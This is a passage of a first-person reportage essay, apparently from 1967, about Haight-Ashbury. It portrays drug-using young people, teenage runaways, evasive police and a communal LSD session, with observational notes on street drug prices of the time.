    &lt;p&gt;Max sees his life as a triumph over ‚Äúdon‚Äôts.‚Äù The don‚Äôts he had done before he was 21 were peyote, alcohol, mescaline, and Methedrine. He was on a Meth trip for three years in New York and Tangier before he found acid. He first tried peyote when he was in an Arkansas boys‚Äô school and got down to the Gulf and met ‚Äúan Indian kid who was doing a don‚Äôt. Then every weekend I could get loose I‚Äôd hitchhike 700 miles to Brownsville, Texas, so I could pop peyote. Peyote went for thirty cents a button down in Brownsville on the street.‚Äù Max dropped in and out of most of the schools and fashionable clinics in the eastern half of America, his standard technique for dealing with boredom being to leave. Example: Max was in a hospital in New York, and ‚Äúthe night nurse was a groovy spade, and in the afternoon for therapy there was a chick from Israel who was interesting, but there was nothing much to do in the morning, so I left.‚Äù&lt;/p&gt;
    &lt;p&gt;We drink some more green tea and talk about going up to Malakoff Diggins, a park in Nevada County, because some people are starting a commune there and Max thinks it would be a groove to take acid there. He says maybe we could go next week, or the week after, or anyway sometime before his case comes up. Almost everybody I meet in San Francisco has to go to court at some point in the middle future. I never ask why.&lt;/p&gt;
    &lt;p&gt;I am still interested in how Max got rid of his middle-class Freudian hang-ups, and I ask if he is now completely free.&lt;/p&gt;
    &lt;p&gt;‚ÄúNah,‚Äù he says. ‚ÄúI got acid.‚Äù&lt;/p&gt;
    &lt;p&gt;Max drops a 250- or 350-microgram tab every six or seven days.&lt;/p&gt;
    &lt;p&gt;Max and Don share a joint in the car, and we go over to North Beach to find out if Otto, who has a temporary job there, wants to go to Malakoff Diggins. Otto is trying to sell something to some electronics engineers. The engineers view our arrival with some interest, maybe, I think, because Max is wearing bells and an Indian headband. Max has a low tolerance for straight engineers and their Freudian hang-ups. ‚ÄúLook at ‚Äôem,‚Äù he says. ‚ÄúThey‚Äôre always yelling ‚Äòqueer,‚Äô and then they come prowling into the Haight-Ashbury trying to get a hippie chick.‚Äù&lt;/p&gt;
    &lt;p&gt;We do not get around to asking Otto about Malakoff Diggins because he wants to tell me about a 14-year-old he knows who got busted in the Park the other day. She was just walking through the Park, he says, minding her own, carrying her schoolbooks, when the cops took her in and booked her and gave her a pelvic. ‚ÄúFourteen years old,‚Äù Otto says. ‚ÄúA pelvic.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúComing down from acid,‚Äù he adds, ‚Äúthat could be a real bad trip.‚Äù&lt;/p&gt;
    &lt;p&gt;I call Otto the next afternoon to see if he can reach the 14-year-old. It turns out she is tied up with rehearsals for her junior-high-school play, The Wizard of Oz. ‚ÄúYellow-brick-road time,‚Äù Otto says. Otto was sick all day. He thinks it was some cocaine somebody gave him.&lt;/p&gt;
    &lt;p&gt;There are always little girls around rock groups ‚Äî the same little girls who used to hang around saxophone players, girls who live on the celebrity and power and sex a band projects when it plays ‚Äî and there are three of them out here this afternoon in Sausalito where a rock group, the Grateful Dead, rehearses. They are all pretty and two of them still have baby fat and one of them dances by herself with her eyes closed.&lt;/p&gt;
    &lt;p&gt;I ask a couple of the girls what they do.&lt;/p&gt;
    &lt;p&gt;‚ÄúI just kind of come out here a lot,‚Äù one of the girls says.&lt;/p&gt;
    &lt;p&gt;‚ÄúI just sort of know the Dead,‚Äù the other says.&lt;/p&gt;
    &lt;p&gt;The one who just sort of knows the Dead starts cutting up a loaf of French bread on the piano bench. The boys take a break, and one of them talks about playing at the Los Angeles Cheetah, which is in the old Aragon Ballroom. ‚ÄúWe were up there drinking beer where Lawrence Welk used to sit,‚Äù he says.&lt;/p&gt;
    &lt;p&gt;The little girl who was dancing by herself giggles. ‚ÄúToo much,‚Äù she says softly. Her eyes are still closed.&lt;/p&gt;
    &lt;p&gt;Somebody said that if I was going to meet some runaways I better pick up a few hamburgers, cola, and French fries on the way, so I did, and we are eating them in the Park together, me, Debbie, who is 15, and Jeff, who is 16. Debbie and Jeff ran away 12 days ago, walked out of school one morning with $100 between them. Because a missing-juvenile is out on Debbie ‚Äî she was already on probation because her mother had once taken her to the police station and declared her incorrigible ‚Äî this is only the second time they have been out of a friend‚Äôs apartment since they got to San Francisco. The first time they went over to the Fairmont Hotel and rode the outside elevator, three times up and three times down. ‚ÄúWow,‚Äù Jeff says, and that is all he can think of to say about that.&lt;/p&gt;
    &lt;p&gt;I ask why they ran away.&lt;/p&gt;
    &lt;p&gt;‚ÄúMy parents said I had to go to church,‚Äù Debbie says. ‚ÄúAnd they wouldn‚Äôt let me dress the way I wanted. In the seventh grade my skirts were longer than anybody‚Äôs ‚Äî it got better in the eighth grade, but still.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYour mother was kind of a bummer,‚Äù Jeff says to her.&lt;/p&gt;
    &lt;p&gt;‚ÄúThey didn‚Äôt like Jeff. They didn‚Äôt like my girl friends. I had a C average and my father told me I couldn‚Äôt date until I raised it, and that bugged me a lot too.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúMy mother was just a genuine all-American bitch.‚Äù Jeff says. ‚ÄúShe was really troublesome about hair. Also, she didn‚Äôt like boots. It was really weird.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúTell about the chores,‚Äù Debbie says.&lt;/p&gt;
    &lt;p&gt;‚ÄúFor example, I had chores. If I didn‚Äôt finish ironing my shirts for the week, I couldn‚Äôt go out for the weekend. It was weird. Wow.‚Äù&lt;/p&gt;
    &lt;p&gt;Debbie giggles and shakes her head. ‚ÄúThis year‚Äôs gonna be wild.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWe‚Äôre just gonna let it all happen,‚Äù Jeff says. ‚ÄúEverything‚Äôs in the future, you can‚Äôt pre-plan it, you know. First we get jobs, then a place to live. Then, I dunno.‚Äù&lt;/p&gt;
    &lt;p&gt;Jeff finishes off the French fries and gives some thought to what kind of job he could get. ‚ÄúI always kinda dug metal shop, welding, stuff like that.‚Äù Maybe he could work on cars, I say. ‚ÄúBut I‚Äôm not too mechanically minded,‚Äù he says. ‚ÄúAnyway, you can‚Äôt pre-plan.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúI could get a job baby-sitting,‚Äù Debbie says. ‚ÄúOr in a dime store.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYou‚Äôre always talking about getting a job in a dime store,‚Äù Jeff says.&lt;/p&gt;
    &lt;p&gt;‚ÄúThat‚Äôs because I worked in a dime store already,‚Äù Debbie says.&lt;/p&gt;
    &lt;p&gt;Debbie is buffing her fingernails with the belt to her suede jacket. She is annoyed because she chipped a nail and because I do not have any polish remover in the car. I promise to get her to a friend‚Äôs apartment so that she can redo her manicure, but something has been bothering me, and as I fiddle with the ignition, I finally ask it. I ask them to think back to when they were children, to tell me what they had wanted to be when they were grown up, how they had seen the future then.&lt;/p&gt;
    &lt;p&gt;Jeff throws a cola bottle out the car window. ‚ÄúI can‚Äôt remember I ever thought about it,‚Äù he says. ‚ÄúI remember I wanted to be a veterinarian once,‚Äù Debbie says. ‚ÄúBut now I‚Äôm more or less working in the vein of being an artist or a model or a cosmetologist. Or something.‚Äù&lt;/p&gt;
    &lt;p&gt;I hear quite a bit about one cop, Officer Arthur Gerrans, whose name has become a synonym for zealotry on the Street. Max is not personally wild about Officer Gerrans because Officer Gerrans took Max in after the Human Be-In last winter, that‚Äôs the big Human Be-In in Golden Gate Park where 20,000 people got turned on free, or 10,000 did, or some number did, but then Officer Gerrans has busted almost everyone in the District at one time or another. Presumably to forestall a cult of personality, Gerrans was transferred out of the District not long ago, and when I see him it is not at the Park Station but at the Central Station.&lt;/p&gt;
    &lt;p&gt;We are in an interrogation room, and I am interrogating Gerrans. He is young, blond, and wary and I go in slow. I wonder what he thinks the major problems in the Haight area are.&lt;/p&gt;
    &lt;p&gt;Officer Gerrans thinks it over. ‚ÄúI would say the major problems there,‚Äù he says finally, ‚Äúthe major problems are narcotics and juveniles. Juveniles and narcotics, those are your major problems.‚Äù&lt;/p&gt;
    &lt;p&gt;I write that down.&lt;/p&gt;
    &lt;p&gt;‚ÄúJust one moment,‚Äù Officer Gerrans says, and leaves the room. When he comes back he tells me that I cannot talk to him without permission from Chief Thomas Cahill.&lt;/p&gt;
    &lt;p&gt;‚ÄúIn the meantime,‚Äù Officer Gerrans adds, pointing at the notebook in which I have written major problems, juveniles, narcotics, ‚ÄúI‚Äôll take those notes.‚Äù&lt;/p&gt;
    &lt;p&gt;The next day I apply for permission to talk to Officer Gerrans and also to Chief Cahill. A few days later a sergeant returns my call.&lt;/p&gt;
    &lt;p&gt;‚ÄúWe have finally received clearance from the chief per your request,‚Äù the sergeant says, ‚Äúand that is taboo.‚Äù&lt;/p&gt;
    &lt;p&gt;I wonder why it is taboo to talk to Officer Gerrans.&lt;/p&gt;
    &lt;p&gt;Officer Gerrans is involved in court cases coming to trial.&lt;/p&gt;
    &lt;p&gt;I wonder why it is taboo to talk to Chief Cahill.&lt;/p&gt;
    &lt;p&gt;The chief has pressing police business.&lt;/p&gt;
    &lt;p&gt;I wonder if I can talk to anyone at all in the police department.&lt;/p&gt;
    &lt;p&gt;‚ÄúNo,‚Äù the sergeant says, ‚Äúnot at the particular moment.‚Äù&lt;/p&gt;
    &lt;p&gt;Which was my last official contact with the San Francisco Police Department.&lt;/p&gt;
    &lt;p&gt;Norris and I are standing around the Panhandle, and Norris is telling me how it is all set up for a friend to take me to Big Sur. I say what I really want to do is spend a few days with Norris and his wife and the rest of the people in their house. Norris says it would be a lot easier if I‚Äôd take some acid. I say I‚Äôm unstable. Norris says, all right, anyway, grass, and he squeezes my hand.&lt;/p&gt;
    &lt;p&gt;One day Norris asks how old I am. I tell him I am 32. It takes a few minutes, but he rises to it. ‚ÄúDon‚Äôt worry,‚Äù he says at last. ‚ÄúThere‚Äôs old hippies too.‚Äù&lt;/p&gt;
    &lt;p&gt;It is a pretty nice evening, nothing much is happening and Max brings his old lady, Sharon, over to the Warehouse. The Warehouse, which is where Don and a floating number of other people live, is not actually a warehouse but the garage of a condemned hotel. The Warehouse was conceived as total theater, a continual happening, and I always feel good there. Somebody is usually doing something interesting, like working on a light show, and there are a lot of interesting things around, like an old touring car which is used as a bed and a vast American flag fluttering up in the shadows and an overstuffed chair suspended like a swing from the rafters.&lt;/p&gt;
    &lt;p&gt;One reason I particularly like the Warehouse is that a child named Michael is staying there now. Michael‚Äôs mother, Sue Ann, is a sweet, wan girl who is always in the kitchen cooking seaweed or baking macrobiotic bread while Michael amuses himself with joss sticks or an old tambourine or an old rocking horse. The first time I ever saw Michael was on that rocking horse, a very blond and pale and dirty child on a rocking horse with no paint. A blue theatrical spotlight was the only light in the Warehouse that afternoon, and there was Michael in it, crooning softly to the wooden horse. Michael is three years old. He is a bright child but does not yet talk.&lt;/p&gt;
    &lt;p&gt;On this night Michael is trying to light his joss sticks and there are the usual number of people floating through and they all drift in and sit on the bed and pass joints. Sharon is very excited when she arrives. ‚ÄúDon,‚Äù she cries breathlessly, ‚Äúwe got some STP today.‚Äù At this time STP, a hallucinogenic drug, is a pretty big deal; remember, nobody yet knew what it was and it was relatively, although just relatively, hard to come by. Sharon is blonde and scrubbed and probably 17, but Max is a little vague about that since his court case comes up in a month or so, and he doesn‚Äôt need statutory rape on top of it. Sharon‚Äôs parents were living apart when she last saw them. She does not miss school or anything much about her past, except her younger brother. ‚ÄúI want to turn him on,‚Äù she confided one day. ‚ÄúHe‚Äôs 14 now, that‚Äôs the perfect age. I know where he goes to high school and someday I‚Äôll just go get him.‚Äù&lt;/p&gt;
    &lt;p&gt;Time passes and I lose the thread and when I pick it up again Max seems to be talking about what a beautiful thing it is the way that Sharon washes dishes.&lt;/p&gt;
    &lt;p&gt;‚ÄúIt is beautiful,‚Äù she says. ‚ÄúEverything is. You watch that blue detergent blob run on the plate, watch the grease cut ‚Äî well, it can be a real trip.‚Äù&lt;/p&gt;
    &lt;p&gt;Pretty soon now, maybe next month, maybe later, Max and Sharon plan to leave for Africa and India, where they can live off the land. ‚ÄúI got this little trust fund, see,‚Äù Max says, ‚Äúwhich is useful in that it tells cops and border patrols I‚Äôm OK, but living off the land is the thing. You can get your high and get your dope in the city, OK, but we gotta get out somewhere and live organically.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúRoots and things,‚Äù Sharon says, lighting a joss stick for Michael. Michael‚Äôs mother is still in the kitchen cooking seaweed. ‚ÄúYou can eat them.‚Äù&lt;/p&gt;
    &lt;p&gt;Maybe eleven o‚Äôclock, we move from the Warehouse to the place where Max and Sharon live with a couple named Tom and Barbara. Sharon is pleased to get home (‚ÄúI hope you got some hash joints fixed in the kitchen,‚Äù she says to Barbara by way of greeting), and everybody is pleased to show off the apartment, which has a lot of flowers and candles and paisleys. Max and Sharon and Tom and Barbara get pretty high on hash, and everyone dances a little and we do some liquid projections and set up a strobe and take turns getting a high on that. Quite late, somebody called Steve comes in with a pretty, dark girl. They have been to a meeting of people who practice a western yoga, but they do not seem to want to talk about that. They lie on the floor awhile, and then Steve stands up.&lt;/p&gt;
    &lt;p&gt;‚ÄúMax,‚Äù he says, ‚ÄúI want to say one thing.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúIt‚Äôs your trip.‚Äù Max is edgy.&lt;/p&gt;
    &lt;p&gt;‚ÄúI found love on acid. But I lost it. And now I‚Äôm finding it again. With nothing but grass.‚Äù&lt;/p&gt;
    &lt;p&gt;Max mutters that heaven and hell are both in one‚Äôs karma.&lt;/p&gt;
    &lt;p&gt;‚ÄúThat‚Äôs what bugs me about psychedelic art,‚Äù Steve says.&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat about psychedelic art?‚Äù Max says. ‚ÄúI haven‚Äôt seen much psychedelic art.‚Äù&lt;/p&gt;
    &lt;p&gt;Max is lying on a bed with Sharon, and Steve leans down. ‚ÄúGroove, baby,‚Äù he says. ‚ÄúYou‚Äôre a groove.‚Äù&lt;/p&gt;
    &lt;p&gt;Steve sits down then and tells me about one summer when he was at a school of design in Rhode Island and took 30 trips, the last ones all bad. I ask why they were bad. ‚ÄúI could tell you it was my neuroses,‚Äù he says, ‚Äúbut forget it.‚Äù&lt;/p&gt;
    &lt;p&gt;A few days later I drop by to see Steve in his apartment. He paces nervously around the room he uses as a studio and shows me some paintings. We do not seem to be getting to the point.&lt;/p&gt;
    &lt;p&gt;‚ÄúMaybe you noticed something going on at Max‚Äôs,‚Äù he says abruptly.&lt;/p&gt;
    &lt;p&gt;It seems that the girl he brought, the dark, pretty one, had once been Max‚Äôs girl. She had followed him to Tangier and now to San Francisco. But Max has Sharon. ‚ÄúSo the girl is kind of staying around here,‚Äù Steve says.&lt;/p&gt;
    &lt;p&gt;Steve is troubled by a lot of things. He is 23, was raised in Virginia and has the idea that California is the beginning of the end. ‚ÄúI feel it‚Äôs insane,‚Äù he says, and his voice drops. ‚ÄúThis chick tells me there‚Äôs no meaning to life, but it doesn‚Äôt matter, we‚Äôll just flow right out. There‚Äôve been times I felt like packing up and taking off for the East Coast again. At least there I had a target. At least there you expect that it‚Äôs going to happen.‚Äù He lights a cigarette for me and his hands shake. ‚ÄúHere you know it‚Äôs not going to.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat is supposed to happen?‚Äù I ask.&lt;/p&gt;
    &lt;p&gt;‚ÄúI don‚Äôt know. Something. Anything.‚Äù&lt;/p&gt;
    &lt;p&gt;Arthur Lisch is on the telephone in his kitchen, trying to sell VISTA a program for the District. ‚ÄúWe‚Äôve already got an emergency,‚Äù he is saying into the telephone, meanwhile trying to disentangle his daughter, age one and a half, from the cord. ‚ÄúWe don‚Äôt get help here, nobody can guarantee what‚Äôs going to happen. We‚Äôve got people sleeping in the streets here. We‚Äôve got people starving to death.‚Äù He pauses. ‚ÄúAll right,‚Äù he says then, and his voice rises. ‚ÄúSo they‚Äôre doing it by choice. So what?‚Äù&lt;/p&gt;
    &lt;p&gt;By the time he hangs up he has limned what strikes me as a pretty Dickensian picture of life on the edge of Golden Gate Park, but then this is my first exposure to Arthur Lisch‚Äôs ‚Äúriot-on-the-Street-unless‚Äù pitch. Arthur Lisch is a kind of leader of the Diggers, who, in the official District mythology, are supposed to be a group of anonymous good guys with no thought in their collective head but to lend a helping hand. The official District mythology also has it that the Diggers have no ‚Äúleaders,‚Äù but nonetheless Arthur Lisch is one. Arthur Lisch is also a paid worker for the American Friends‚Äô Service Committee, and he lives with his wife, Jane, and their two small children in a railroad flat, which on this particular day lacks organization. For one thing, the telephone keeps ringing. Arthur promises to attend a hearing at city hall. Arthur promises to ‚Äúsend Edward, he‚Äôs OK.‚Äù Arthur promises to get a good group, maybe the Loading Zone, to play free for a Jewish benefit. For a second thing, the baby is crying, and she does not stop until Jane appears with a jar of Gerber‚Äôs Chicken Noodle Dinner. Another confusing element is somebody named Bob, who just sits in the living room and looks at his toes. First he looks at the toes on one foot, then at the toes on the other. I make several attempts to include Bob before I realize he is on a bad trip. Moreover, there are two people hacking up what looks like a side of beef on the kitchen floor, the idea being that when it gets hacked up, Jane Lisch can cook it for the daily Digger feed in the park.&lt;/p&gt;
    &lt;p&gt;Arthur Lisch does not seem to notice any of this. He just keeps talking about cybernated societies and the guaranteed annual wage and riot on the Street, unless.&lt;/p&gt;
    &lt;p&gt;I call the Lisches a day or so later and ask for Arthur. Jane Lisch says he‚Äôs next door taking a shower because somebody is coming down from a bad trip in their bathroom. Besides the freak-out in the bathroom, they are expecting a psychiatrist in to look at Bob. Also a doctor for Edward, who is not OK at all but has the flu. Jane says maybe I should talk to Chester Anderson. She will not give me his number.&lt;/p&gt;
    &lt;p&gt;Chester Anderson is a legacy of the Beat Generation, a man in his middle 30s whose peculiar hold on the District derives from his possession of a mimeograph machine, on which he prints communiqu√©s signed ‚Äúthe communication company.‚Äù It is another tenet of the official District mythology that the communication company will print anything anybody has to say, but in fact Chester Anderson prints only what he writes himself, agrees with, or considers harmless or dead matter. His statements, which are left in piles and pasted on windows around Haight Street, are regarded with some apprehension in the District and with considerable interest by outsiders, who study them, like China watchers, for subtle shifts in obscure ideologies. An Anderson communiqu√© might be as specific as fingering someone who is said to have set up a marijuana bust, or it might be in a more general vein:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Pretty little 16-year-old middle-class chick comes to the Haight to see what it‚Äôs all about and gets picked up by a 17-year-old street dealer who spends all day shooting her full of speed again and again, then feeds her 3,000 mikes &amp;amp; raffles off her temporarily unemployed body for the biggest Haight Street . . . . since the night before last. The politics and ethics of ecstasy. Rape is as common as . . . . on Haight Street. Kids are starving on the Street. Minds and bodies are being maimed as we watch, a scale model of Vietnam.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Somebody other than Jane Lisch gave me an address for Chester Anderson, 443 Arguello, but 443 Arguello does not exist. I telephone the wife of the man who gave me 443 Arguello and she says it‚Äôs 742 Arguello.&lt;/p&gt;
    &lt;p&gt;‚ÄúBut don‚Äôt go up there,‚Äù she says.&lt;/p&gt;
    &lt;p&gt;I say I‚Äôll telephone.&lt;/p&gt;
    &lt;p&gt;‚ÄúThere‚Äôs no number,‚Äù she says. ‚ÄúI can‚Äôt give it to you.‚Äù&lt;/p&gt;
    &lt;p&gt;‚Äú742 Arguello,‚Äù I say.&lt;/p&gt;
    &lt;p&gt;‚ÄúNo,‚Äù she says. ‚ÄúI don‚Äôt know. And don‚Äôt go there. And don‚Äôt use either my name or my husband‚Äôs name if you do.‚Äù&lt;/p&gt;
    &lt;p&gt;She is the wife of a full professor of English at San Francisco State College. I decide to lie low on the question of Chester Anderson for a while.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Paranoia strikes deep ‚Äî&lt;/p&gt;&lt;lb/&gt;Into your life it will creep ‚Äî&lt;lb/&gt;is a song the Buffalo&lt;lb/&gt;Springfield sings.&lt;/quote&gt;
    &lt;p&gt;The appeal of Malakoff Diggins has kind of faded out, but Max says why don‚Äôt I come to his place, just be there, the next time he takes acid. Tom will take it too, probably Sharon, maybe Barbara. We can‚Äôt do it for six or seven days because Max and Tom are in STP space now. They are not crazy about STP, but it has advantages. ‚ÄúYou‚Äôve still got your forebrain.‚Äù Tom says. ‚ÄúI could write behind STP, but not behind acid.‚Äù This is the first time I have heard that Tom writes.&lt;/p&gt;
    &lt;p&gt;Otto is feeling better because he discovered it wasn‚Äôt the cocaine that made him sick. It was the chicken pox, which he caught while baby-sitting for Big Brother and the Holding Company one night when they were playing. I go over to see him and meet Vicki, who sings now and then with a group called the Jook Savages and lives at Otto‚Äôs place. Vicki dropped out of Laguna High ‚Äúbecause I had mono,‚Äù followed the Grateful Dead up to San Francisco one time, and has been here ‚Äúfor a while.‚Äù Her mother and father are divorced, and she does not see her father, who works for a network in New York. A few months ago he came out to do a documentary on the District and tried to find her, but couldn‚Äôt. Later he wrote her a letter in care of her mother urging her to go back to school. Vicki guesses maybe she will go back sometime, but she doesn‚Äôt see much point in it right now.&lt;/p&gt;
    &lt;p&gt;We are eating a little tempura in Japantown, Chet Helms and I, and he is sharing some of his insights with me. Until a couple of years ago Chet Helms never did much besides hitchhiking, but now he runs the Avalon Ballroom and flies over the Pole to check out the London scene and says things like, ‚ÄúJust for the sake of clarity I‚Äôd like to categorize the aspects of primitive religion as I see it.‚Äù Right now he is talking about Marshall McLuhan and how the printed word is finished, out, over. But then he considers the East Village Other, an ‚Äúunderground‚Äù biweekly published in New York. ‚ÄúThe EVO is one of the few papers in America whose books are in the black,‚Äù he says. ‚ÄúI know that from reading Barron‚Äôs.‚Äù&lt;/p&gt;
    &lt;p&gt;A new group is supposed to play today in the Panhandle, a section of Golden Gate Park, but they are having trouble with the amplifier and I sit in the sun listening to a couple of little girls, maybe 17 years old. One of them has a lot of makeup and the other wears Levi‚Äôs and cowboy boots. The boots do not look like an affectation, they look like she came up off a ranch about two weeks ago. I wonder what she is doing here in the Panhandle, trying to make friends with a city girl who is snubbing her, but I do not wonder long, because she is homely and awkward, and I think of her going all the way through the consolidated union high school out there where she comes from, and nobody ever asking her to go into Reno on Saturday night for a drive-in movie and a beer on the riverbank, so she runs. ‚ÄúI know a thing about dollar bills,‚Äù she is saying now. ‚ÄúYou get one that says ‚Äò1111‚Äô in one corner and ‚Äò1111‚Äô in another, you take it down to Dallas, Texas, and they‚Äôll give you $15 for it.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWho will?‚Äù the city girl asks.&lt;/p&gt;
    &lt;p&gt;‚ÄúI don‚Äôt know.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúThere are only three significant pieces of data in the world today,‚Äù is another thing Chet Helms told me one night. We were at the Avalon and the big strobe was going and so were the colored lights and the Day-Glo painting, and the place was full of high-school kids trying to look turned on. The Avalon sound system projects 126 decibels at 100 feet but to Chet Helms the sound is just there, like the air, and he talks through it. ‚ÄúThe first is,‚Äù he said, ‚ÄúGod died last year and was obited by the press. The second is, 50 percent of the population is or will be under 25.‚Äù A boy shook a tambourine toward us and Chet smiled benevolently at him. ‚ÄúThe third,‚Äù he said, ‚Äúis that they got 20 billion irresponsible dollars to spend.‚Äù&lt;/p&gt;
    &lt;p&gt;Thursday comes, some Thursday, and Max and Tom and Sharon and maybe Barbara are going to take some acid. They want to drop it about three o‚Äôclock. Barbara has baked fresh bread, Max has gone to the Park for fresh flowers, and Sharon is busy making a sign for the door which reads, DO NOT DISTURB, RING, KNOCK, OR IN ANY OTHER WAY DISTURB. LOVE. This is not how I would put it to either the health inspector, who is due this week, or any of the several score of narcotics agents in the neighborhood, but I figure the sign is Sharon‚Äôs trip.&lt;/p&gt;
    &lt;p&gt;Once the sign is finished Sharon gets restless. ‚ÄúCan I at least play the new record?‚Äù she asks Max.&lt;/p&gt;
    &lt;p&gt;‚ÄúTom and Barbara want to save it for when we‚Äôre high.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúI‚Äôm getting bored, just sitting around here.‚Äù&lt;/p&gt;
    &lt;p&gt;Max watches her jump up and walk out. ‚ÄúThat‚Äôs what you call pre-acid uptight jitters,‚Äù he says.&lt;/p&gt;
    &lt;p&gt;Barbara is not in evidence. Tom keeps walking in and out. ‚ÄúAll these innumerable last-minute things you have to do,‚Äù he mutters.&lt;/p&gt;
    &lt;p&gt;‚ÄúIt‚Äôs a tricky thing, acid,‚Äù Max says after a while. He is turning the stereo on and off. ‚ÄúWhen a chick takes acid, it‚Äôs all right if she‚Äôs alone, but when she‚Äôs living with somebody this edginess comes out. And if the hour-and-a-half process before you take the acid doesn‚Äôt go smooth. . . .‚Äù He picks up a marijuana butt and studies it, then adds, ‚ÄúThey‚Äôre having a little thing back there with Barbara.‚Äù&lt;/p&gt;
    &lt;p&gt;Sharon and Tom walk in.&lt;/p&gt;
    &lt;p&gt;‚ÄúYou bugged too?‚Äù Max asks Sharon.&lt;/p&gt;
    &lt;p&gt;Sharon does not answer.&lt;/p&gt;
    &lt;p&gt;Max turns to Tom. ‚ÄúIs she all right?‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúYeh.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúCan we take acid?‚Äù Max is on edge.&lt;/p&gt;
    &lt;p&gt;‚ÄúI just don‚Äôt know what she‚Äôs going to do.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat do you want to do?‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat I want to do depends on what she wants to do.‚Äù Tom is rolling some joints, first rubbing the papers with a marijuana resin he makes himself. He takes the joints back to the bedroom, and Sharon goes with him.&lt;/p&gt;
    &lt;p&gt;‚ÄúSomething like this happens every time people take acid,‚Äù Max says. After a while he brightens and develops a theory around it. ‚ÄúSome people don‚Äôt like to go out of themselves, that‚Äôs the trouble. You probably wouldn‚Äôt. You‚Äôd probably like only a quarter of a tab. There‚Äôs still an ego on a quarter tab, and it wants things. Now if that thing is sex‚Äî and your old lady or your old man is off somewhere flashing and doesn‚Äôt want to be touched ‚Äî well, you get put down on acid, you can be on a bummer for months.‚Äù&lt;/p&gt;
    &lt;p&gt;Sharon drifts in, smiling. ‚ÄúBarbara might take some acid, we‚Äôre all feeling better, we smoked a joint.‚Äù&lt;/p&gt;
    &lt;p&gt;At 3:30 that afternoon Max, Tom, and Sharon placed tabs under their tongues and sat down together in the living room to wait for the flash. Barbara stayed in the bedroom, smoking hash. During the next four hours a window banged once in Barbara‚Äôs room, and about 5:30 some children had a fight on the street. A curtain billowed in the afternoon wind. A cat scratched a beagle in Sharon‚Äôs lap. Except for the sitar music on the stereo there was no other sound or movement until 7:30, when Max said, ‚ÄúWow.‚Äù&lt;/p&gt;
    &lt;p&gt;I spot Deadeye on Haight Street, and he gets in the car. Until we get off the Street he sits very low and inconspicuous. Deadeye wants me to meet his old lady, but first he wants to talk to me about how he got hip to helping people.&lt;/p&gt;
    &lt;p&gt;‚ÄúHere I was, just a tough kid on a motorcycle,‚Äù he says, ‚Äúand suddenly I see that young people don‚Äôt have to walk alone.‚Äù Deadeye has a clear evangelistic gaze and the reasonable rhetoric of a car salesman. He is society‚Äôs model product. I try to meet his gaze directly because he once told me he could read character in people‚Äôs eyes, particularly if he has just dropped acid, which he did about nine o‚Äôclock that morning. ‚ÄúThey just have to remember one thing,‚Äù he says. ‚ÄúThe Lord‚Äôs Prayer. And that can help them in more ways than one.‚Äù&lt;/p&gt;
    &lt;p&gt;He takes a much-folded letter from his wallet. The letter is from a little girl he helped. ‚ÄúMy loving brother,‚Äù it begins. ‚ÄúI thought I‚Äôd write you a letter since I‚Äôm a part of you. Remember that: When you feel happiness, I do, when you feel . . .‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúWhat I want to do now,‚Äù Deadeye says, ‚Äúis set up a house where a person of any age can come, spend a few days, talk over his problems. Any age. People your age, they‚Äôve got problems too.‚Äù&lt;/p&gt;
    &lt;p&gt;I say a house will take money.&lt;/p&gt;
    &lt;p&gt;‚ÄúI‚Äôve found a way to make money,‚Äù Deadeye says. He hesitates only a few seconds. ‚ÄúI could‚Äôve made $85 on the Street just then. See, in my pocket I had a hundred tabs of acid. I had to come up with $20 by tonight or we‚Äôre out of the house we‚Äôre in, so I knew somebody who had acid, and I knew somebody who wanted it, so I made the connection.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;‚ÄúSince the Mafia moved into the LSD racket, the quantity is up and the quality is down. . . .&lt;/p&gt;&lt;lb/&gt;‚ÄúHistorian Arnold Toynbee celebrated his 78th birthday Friday night by snapping his fingers and tapping his toes to the Quicksilver Messenger Service . . .‚Äù&lt;/quote&gt;
    &lt;p&gt;are a couple of items from Herb Caen‚Äôs column one morning as the West declined in the year 1967.&lt;/p&gt;
    &lt;p&gt;When I was in San Francisco a tab, or a cap, of LSD-25 sold for three to five dollars, depending upon the seller and the district. LSD was slightly cheaper in the Haight-Ashbury than in the Fillmore, where it was used rarely, mainly as a sexual ploy, and sold by pushers of hard drugs, e.g., heroin, or ‚Äúsmack.‚Äù A great deal of acid was being cut with Methedrine, which is the trade name for an amphetamine, because Methedrine can simulate the flash that low-quality acid lacks. Nobody knows how much LSD is actually in a tab, but the standard trip is supposed to be 250 micrograms. Grass was running $10 a lid, $5 a matchbox. Hash was considered ‚Äúa luxury item.‚Äù All the amphetamines, or ‚Äúspeed‚Äù ‚Äî Benzedrine, Dexedrine, and particularly Methedrine (‚Äúcrystal‚Äù) ‚Äî were in common use. There was not only more tolerance of speed but there was a general agreement that heroin was now on the scene. Some attributed this to the presence of the Syndicate; others to a general deterioration of the scene, to the incursions of gangs and younger part-time, or ‚Äúplastic,‚Äù hippies, who like the amphetamines and the illusions of action and power they give. Where Methedrine is in wide use, heroin tends to be available, because, I was told, ‚ÄúYou can get awful damn high shooting crystal, and smack can be used to bring you down.‚Äù&lt;/p&gt;
